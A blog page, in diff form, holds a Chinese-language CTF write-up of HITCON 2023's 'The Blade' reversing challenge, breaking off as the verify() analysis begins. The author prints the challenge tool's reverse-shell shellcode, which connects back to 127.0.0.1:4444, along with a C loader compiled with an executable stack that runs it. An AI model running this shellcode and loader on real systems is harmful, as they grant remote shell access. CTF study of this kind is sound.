@@ -1,0 +1,1043 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+    
+    <meta name="author" content="kazma">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kazma.tw/2024/02/19/hitcon-ctf-2023-full-chain-the-blade-writeup/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="HITCON-CTF-2023 - Full Chain - The BladeDescription A Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.(Hey, this is my">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON-CTF-2023 Full Chain - The Blade Writeup">
+<meta property="og:url" content="https://kazma.tw/2024/02/19/HITCON-CTF-2023-Full-Chain-The-Blade-Writeup/index.html">
+<meta property="og:site_name" content="kazma&#39;s blog">
+<meta property="og:description" content="HITCON-CTF-2023 - Full Chain - The BladeDescription A Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.(Hey, this is my">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kazma.tw/images/blade_verify.png">
+<meta property="og:image" content="https://kazma.tw/images/blade_flag.png">
+<meta property="og:image" content="https://kazma.tw/images/blade_enc.png">
+<meta property="og:image" content="https://kazma.tw/images/blade_xmm.png">
+<meta property="og:image" content="https://kazma.tw/images/blade_uint32_2.png">
+<meta property="article:published_time" content="2024-02-18T17:44:30.000Z">
+<meta property="article:modified_time" content="2024-02-28T14:14:45.311Z">
+<meta property="article:author" content="kazma">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="hitconctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kazma.tw/images/blade_verify.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/kazma.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/kazma.png">
+    <meta name="theme-color" content="#94878e">
+    <link rel="shortcut icon" href="/images/kazma.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HITCON-CTF-2023 Full Chain - The Blade Writeup -
+        
+        kazma&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kazma.tw","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["成大資安社 創辦人/社長"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#94878e","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/smoke.png"},"title":"kazma.tw","subtitle":{"text":["Pwning my life: ","Tales of coding, cybersecurity, and campus life"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#FFFFFF"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kazmatw","instagram":"https://www.instagram.com/kazma.tw/","zhihu":null,"twitter":null,"email":"kazmatw@gmail.com","telegram":"https://t.me/kazma_tw","discord":"https://discord.com/users/870280109360316457"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.0","navbar":{"auto_hide":false,"color":{"left":"#5d5764","right":"#94878e","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"ls":{"path":"/archives","icon":"fa-regular fa-archive"},"tags":{"icon":"fa-solid fa-tags","path":"/tags"},"whoami":{"path":"/whoami","icon":"fa-regular fa-user"},"cv":{"path":"/cv","icon":"fa-regular fa-file"},"ctfd":{"path":"https://class.nckuctf.org/","icon":"fa-brands fa-font-awesome"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/10/25 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/sharp-solid.min.css">
+
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/kazma.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                kazma&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        LS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                            <i class="fa-solid fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/whoami"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        WHOAMI
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/cv"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-file"></i>
+                                        
+                                        CV
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    target="_blank" rel="noopener" href="https://class.nckuctf.org/"  >
+                                    
+                                        
+                                            <i class="fa-brands fa-font-awesome"></i>
+                                        
+                                        CTFD
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                LS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags"  >
+                             
+                                
+                                    <i class="fa-solid fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/whoami"  >
+                             
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                WHOAMI
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/cv"  >
+                             
+                                
+                                    <i class="fa-regular fa-file"></i>
+                                
+                                CV
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        target="_blank" rel="noopener" href="https://class.nckuctf.org/"  >
+                             
+                                
+                                    <i class="fa-brands fa-font-awesome"></i>
+                                
+                                CTFD
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">HITCON-CTF-2023 Full Chain - The Blade Writeup</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header flex flex-row gap-2 items-center">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/kazma.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-02-19 01:44:30</span>
+        <span class="mobile">2024-02-19 01:44:30</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-02-28 22:14:45</span>
+            <span class="mobile">2024-02-28 22:14:45</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/reverse/">reverse</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/hitconctf/">hitconctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h1 id="HITCON-CTF-2023-Full-Chain-The-Blade"><a href="#HITCON-CTF-2023-Full-Chain-The-Blade" class="headerlink" title="HITCON-CTF-2023 - Full Chain - The Blade"></a>HITCON-CTF-2023 - Full Chain - The Blade</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>A Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.<br>(Hey, this is my first Rust project. Feel free to give me any advice and criticism 😃)</p>
+</blockquote>
+<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/hitconctf/ctf2023.hitcon.org/releases/download/v1.0.0/blade-4c2ff1b60902623f702f0245a6a9ea0e71eeb385" >https://github.com/hitconctf/ctf2023.hitcon.org/releases/download/v1.0.0/blade-4c2ff1b60902623f702f0245a6a9ea0e71eeb385 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>例行檢查：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file blade</span><br><span class="line">blade: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0c08e0f6f802d4a18151f338c9aab85e8b8f66d3, <span class="keyword">for</span> GNU/Linux 4.4.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure></div>
+<p>執行看看：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./blade</span><br><span class="line">&gt; <span class="built_in">test</span></span><br><span class="line">[-] Unknown <span class="built_in">command</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command       Description</span><br><span class="line">        -------       -----------</span><br><span class="line">        <span class="built_in">help</span>          Help menu</span><br><span class="line">        server        Establish C&amp;C server</span><br><span class="line">        <span class="built_in">exit</span>          Exit program</span><br></pre></td></tr></table></figure></div>
+<p>可以看到提供三個功能，不過 <code>help</code> 跟 <code>exit</code> 沒什麼特別的，我們試試 <code>server</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command                Description</span><br><span class="line">        -------                -----------</span><br><span class="line">        options                List all options</span><br><span class="line">        <span class="built_in">set</span> &lt;option&gt; &lt;value&gt;   Set option</span><br><span class="line">        run                    Start server</span><br><span class="line">        close                  Close server</span><br><span class="line">        back                   Back to menu</span><br><span class="line">server&gt; options</span><br><span class="line"></span><br><span class="line">    Options</span><br><span class="line">    =======</span><br><span class="line"></span><br><span class="line">        Option        Value           Description</span><br><span class="line">        ------        -----           -----------</span><br><span class="line">        host          127.0.0.1       Server host</span><br><span class="line">        port          4444            Server port</span><br><span class="line">        format        quoted          Shellcode format</span><br><span class="line">        read_syscall  SYS_read        Read syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Available Syscalls</span><br><span class="line">    ==================</span><br><span class="line"></span><br><span class="line">        Verb          Syscalls</span><br><span class="line">        ----          --------</span><br><span class="line">        read_syscall  SYS_read, SYS_recvfrom</span><br><span class="line"></span><br><span class="line">    Shellcode Formats</span><br><span class="line">    ==================</span><br><span class="line"></span><br><span class="line">        Format        Example</span><br><span class="line">        -------       -------</span><br><span class="line">        quoted        <span class="string">&quot;\xde\xad\xbe\xef&quot;</span></span><br><span class="line">        hex           deadbeef</span><br></pre></td></tr></table></figure></div>
+<p>看起來這個 <code>server</code> 模式就是剛剛題目敘述提到的 <code>seccomp environment</code>，並且可以設定一些相關參數。<br>Start server 看看:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./blade</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br></pre></td></tr></table></figure></div>
+<p>Start 之後可以看到他要我們在受害者的電腦上執行一段 shellcode，然後在 <code>127.0.0.1:4444</code> 有服務等待連接。<br>直接 nc 上去執行指令會噴一堆亂碼，然後還會卡住，感覺不太像是正常的交互，我在同一個資料夾下面建一個 shellcode.c 來執行這段 shellcode，注意在 compile 的時候要關掉 NX：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span>;</span><br><span class="line">    ((<span class="type">void</span> (*)())(shellcode))();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc shellcode.c -o shellcode -z execstack</span></span><br></pre></td></tr></table></figure></div>
+<p>執行後就會拿到 reverse shell 了，指令也都可以正常執行:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./blade</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line">[+] Connection established from 127.0.0.1:43654</span><br><span class="line">$ <span class="built_in">test</span></span><br><span class="line">[-] Unknown <span class="built_in">command</span> <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command                    Description                                    Syscalls</span><br><span class="line">        -------                    -------                                        -----------</span><br><span class="line">        <span class="built_in">help</span>                       Print This Menu                                N/A</span><br><span class="line">        <span class="built_in">ls</span> [DIR]                   List Directory                                 SYS_open, SYS_getdents</span><br><span class="line">        <span class="built_in">dir</span> [DIR]                  List Directory                                 SYS_open, SYS_getdents</span><br><span class="line">        <span class="built_in">cat</span> &lt;FILE&gt;                 Print File Content                             SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">cd</span> &lt;DIR&gt;                   Change Directory                               SYS_chdir</span><br><span class="line">        <span class="built_in">pwd</span>                        Print Current Directory                        SYS_getcwd</span><br><span class="line">        download &lt;FILE&gt;            Download File                                  SYS_open, SYS_close</span><br><span class="line">        upload &lt;FILE&gt; [PERM]       Upload File                                    SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">rm</span> &lt;FILE&gt;                  Remove File                                    SYS_unlink</span><br><span class="line">        <span class="built_in">mv</span> &lt;SOURCE&gt; &lt;DEST&gt;         Move File                                      SYS_rename</span><br><span class="line">        <span class="built_in">cp</span> &lt;SOURCE&gt; &lt;DEST&gt; [PERM]  Copy File                                      SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">mkdir</span> &lt;DIR&gt; [PERM]         Create a Directory                             SYS_mkdir</span><br><span class="line">        <span class="built_in">rmdir</span> &lt;DIR&gt;                Remove a Directory                             SYS_rmdir</span><br><span class="line">        getuid                     Get Current UID                                SYS_getuid</span><br><span class="line">        getgid                     Get Current GID                                SYS_getgid</span><br><span class="line">        portscan                   Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        netcat &lt;INPUT_FILE&gt; &lt;Port&gt; Send Data <span class="keyword">in</span> the Input File to Port            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">                                   and Receive Output</span><br><span class="line">        http-shell                 HTTP Interactive Shell                         SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        redis-cli                  Simple Redis Client                            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        <span class="built_in">exit</span>                       Exit shell                                     N/A</span><br><span class="line">        quit                       Exit shell                                     N/A</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[+] Listing directory <span class="string">&#x27;.&#x27;</span></span><br><span class="line">shellcode.c</span><br><span class="line">blade</span><br><span class="line">shellcode</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div>
+<p>看了 menu 之後沒看到任何跟 flag checker 有關的指令，我們再回憶一下題目敘述：</p>
+<blockquote>
+<p>Your goal is to pass the hidden flag checker concealed in the binary.</p>
+</blockquote>
+<p>上面的翻譯是：該開 IDA 了 XD</p>
+<h2 id="0x2-Reverse-Engineering"><a href="#0x2-Reverse-Engineering" class="headerlink" title="0x2 Reverse Engineering"></a>0x2 Reverse Engineering</h2><p>丟進 IDA 後在 <code>Function name</code> 逛了一下後會看到剛剛 server 模式的那些指令，而這邊函式名前綴為 <code>seccomp_shell</code> 也符合我們的猜測，其中有個可疑的 <code>verify()</code> 函式，感覺蠻可能跟 flag checker 有關聯：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/blade_verify.png"
+                      alt="verify"
+                ><br>但分析 <code>verify()</code> 前，我們先找到呼叫 <code>verify()</code> 的地方，這樣方便我們透過傳入的參數去推理逆向，也有機會找到他用來檢查 flag 的指令，那 <code>prompt()</code> 感覺就是在做管理整個 <code>seccomp_shell</code> 之類的功能，我們從這裡先開始分析。</p>
+<h3 id="prompt"><a href="#prompt" class="headerlink" title="prompt()"></a>prompt()</h3><p><code>void ***__fastcall seccomp_shell::shell::prompt::h76cecfe7bd3bdf50(__int64 a1)</code><br>接收了一個參數應該就是指令，我們重新命名整理一下：<br><code>a1 -&gt; inputCommand</code><br>接著發現指令呼叫時傳入的第一個參數都是 <code>v162</code>，而且 <code>v162</code> 就是剛剛的 <code>a1</code>，所以給他個新名字：<br><code>v162 -&gt; commandString</code><br>再來就大概花了億點時間在尋找用來觸發 <code>verify()</code> 的指令，看了很久都沒啥進展的同時決定出門吃個晚餐，回來發現學長把電腦重開機（RDP 到社團的公共電腦），IDA 只好重新解一次，沒想到解完後就正常多了，如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/blade_flag.png"
+                      alt="flag"
+                ><br>看到這次他把他解成 switch，然後 case 看起來像是 ASCII 的字串，對字串按 r 之後可以看到 little endian 的 <code>flag</code>、<code>exit</code> 和 <code>quit</code> 等指令，測試一下 <code>flag</code> 指令：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ flag hitcon&#123;flag&#125;</span><br><span class="line">[-] Incorrect</span><br></pre></td></tr></table></figure></div>
+<p>看起來很對，差不多該分析 <code>verify()</code> 了。</p>
+<h3 id="verify"><a href="#verify" class="headerlink" title="verify()"></a>verify()</h3><ol>
